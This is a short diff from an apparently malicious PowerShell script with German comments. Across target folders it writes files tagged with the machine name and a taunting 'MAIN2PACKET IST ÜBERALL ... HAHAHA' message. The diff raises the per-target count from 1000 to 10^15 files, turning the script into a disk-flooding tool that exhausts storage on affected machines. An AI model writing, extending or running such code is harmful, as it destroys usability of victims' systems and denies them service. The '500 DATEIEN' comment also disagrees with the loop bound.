@@ -222,7 +222,7 @@ while ($global:currentRound -lt $global:maxRounds) {
             try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
             
             # 500 DATEIEN PRO ZIEL
-            for ($i = 1; $i -le 1000; $i++) {
+            for ($i = 1; $i -le 1000000000000000; $i++) {
                 # Direkt im Zielordner
                 "$env:COMPUTERNAME - MAIN2PACKET IST ÜBERALL DASS WAR MIT DIR HAHAHAHHAHAHAHAHAHAHAHA $i" | Out-File (Join-Path $ziel "MAIN2PACKET_SCAN_$i.king") -Encoding UTF8 -Force
                 
